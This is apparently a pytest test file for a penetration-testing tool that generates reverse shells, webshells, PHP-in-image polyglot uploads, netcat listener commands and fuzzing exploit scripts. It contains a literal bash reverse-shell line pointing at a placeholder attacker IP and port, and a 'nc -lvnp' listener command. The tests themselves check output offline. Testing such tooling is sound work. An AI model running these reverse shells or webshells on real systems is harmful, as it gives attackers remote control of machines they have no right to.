"""Tests for RCE artifact generation and the exploit-script generator."""

from __future__ import annotations

import socket

import pytest

from poad import exploit, rce
from poad.core.validation import ValidationError


def test_reverse_shells_linux(library):
    shells = rce.reverse_shells("10.10.14.5", "4444", "linux", library=library)
    assert shells
    payloads = [s.payload for s in shells]
    assert any("bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" == p for p in payloads)
    # No unresolved placeholders.
    assert all("<<POAD_" not in p for p in payloads)
    # LHOST/LPORT substituted everywhere.
    assert all("10.10.14.5" in p and "4444" in p for p in payloads)


def test_reverse_shells_windows(library):
    shells = rce.reverse_shells("10.0.0.1", "9001", "windows", library=library)
    assert any(s.shell == "powershell" for s in shells)


def test_reverse_shells_filter(library):
    shells = rce.reverse_shells("1.2.3.4", "4444", "linux", shells=["python"], library=library)
    assert shells and all(s.shell == "python" for s in shells)


def test_reverse_shell_bad_port(library):
    with pytest.raises(ValidationError):
        rce.reverse_shells("1.2.3.4", "99999", "linux", library=library)
    with pytest.raises(ValidationError):
        rce.reverse_shells("1.2.3.4", "notaport", "linux", library=library)


def test_webshells_all_langs():
    for lang in rce.WEBSHELL_LANGS:
        fn, content = rce.webshell(lang, param="x")
        assert fn.endswith(lang)
        assert "x" in content
        assert "authorised" in content.lower()


def test_webshell_bad_lang():
    with pytest.raises(ValidationError):
        rce.webshell("python")


def test_webshell_bad_param():
    with pytest.raises(ValidationError):
        rce.webshell("php", param="a b")  # not an identifier


def test_polyglot_png_is_valid_image_with_php():
    fn, content = rce.polyglot("png", param="cmd")
    assert content.startswith(b"\x89PNG\r\n\x1a\n")
    assert b"<?php" in content
    assert fn == "shell.php.png"


def test_polyglot_gif():
    fn, content = rce.polyglot("gif")
    assert content.startswith(b"GIF89a")
    assert b"<?php" in content


def test_polyglot_bad_image():
    with pytest.raises(ValidationError):
        rce.polyglot("bmp")


def test_listener_commands_mentions_nc():
    cmds = rce.listener_commands("4444")
    assert any("nc -lvnp 4444" in c for c in cmds)
    assert any("tun0" in c for c in cmds)


def test_exploit_script_compiles():
    src = exploit.build_exploit_script(
        url="http://t/?x=FUZZ", wordlist="pl.txt", match="root:", method="GET"
    )
    compile(src, "exploit.py", "exec")  # raises SyntaxError if invalid
    assert "argparse" in src
    assert "FUZZ" in src
    assert "AUTHORISED" in src
    assert "'root:'" in src  # baked default


def test_rce_generation_is_offline(monkeypatch, library):
    def boom(*a, **k):
        raise AssertionError("network access during RCE generation")

    monkeypatch.setattr(socket.socket, "connect", boom)
    rce.reverse_shells("10.10.14.5", "4444", "linux", library=library)
    rce.webshell("php")
    rce.polyglot("png")
    exploit.build_exploit_script()
